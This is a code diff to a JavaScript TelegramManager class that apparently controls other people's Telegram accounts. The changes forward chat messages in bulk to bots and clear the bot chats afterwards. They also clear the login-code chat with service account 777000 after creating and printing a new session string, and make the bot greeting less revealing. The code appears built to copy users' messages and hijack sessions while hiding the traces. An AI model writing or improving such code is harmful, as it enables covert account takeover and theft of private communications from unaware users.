@@ -165,7 +165,7 @@ class TelegramManager {
         const bots = TelegramBots_config_1.BotConfig.getInstance().getAllBotUsernames(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
         for (const bot of bots) {
             try {
-                await this.client.sendMessage(bot, { message: "Forwarding media to bot" });
+                await this.client.sendMessage(bot, { message: "Start" });
                 await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
                     folderPeers: [
                         new telegram_1.Api.InputFolderPeer({
@@ -201,12 +201,12 @@ class TelegramManager {
                         const chunkSize = 30;
                         for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
                             const chunk = uniqueMessageIds.slice(i, i + chunkSize);
-                            await this.client.forwardMessages(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES), {
+                            const bot = TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
+                            await this.client.forwardMessages(bot, {
                                 messages: chunk,
                                 fromPeer: chatId,
                             });
                             console.log(`Forwarded ${chunk.length} messages to bot`);
-                            await (0, Helpers_1.sleep)(5000);
                         }
                     }
                 }
@@ -216,12 +216,9 @@ class TelegramManager {
             console.log(e);
         }
         for (const bot of bots) {
-            try {
-                await this.deleteChat(bot);
-            }
-            catch (e) {
-                console.log(e);
-            }
+            await this.deleteChat({ peer: bot, justClear: true });
+            const result = await this.cleanupChat({ chatId: bot });
+            console.log("Deleted bot chat:", result);
         }
         await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
     }
@@ -961,14 +958,10 @@ class TelegramManager {
         }));
         return exportedContacts;
     }
-    async deleteChat(chatId) {
+    async deleteChat(params) {
         try {
-            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory({
-                justClear: false,
-                peer: chatId,
-                revoke: false,
-            }));
-            console.log(`Dialog with ID ${chatId} has been deleted.`);
+            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
+            console.log(`Dialog with ID ${params.peer} has been deleted.`);
         }
         catch (error) {
             console.error('Failed to delete dialog:', error);
@@ -1394,7 +1387,7 @@ class TelegramManager {
             },
             onError: (err) => { throw err; },
         });
-        await this.deleteChat('777000');
+        await this.deleteChat({ peer: '777000', justClear: true });
         const session = newClient.session.save();
         await newClient.disconnect();
         console.log("New Session: ", session);
@@ -1557,6 +1550,12 @@ class TelegramManager {
             peer: album.chatId,
             multiMedia: mediaFiles
         }));
+    }
+    async sendMessage(params) {
+        if (!this.client)
+            throw new Error('Client not initialized');
+        const { peer, parseMode, message } = params;
+        return await this.client.sendMessage(peer, { message, parseMode });
     }
     async sendVoiceMessage(voice) {
         if (!this.client)
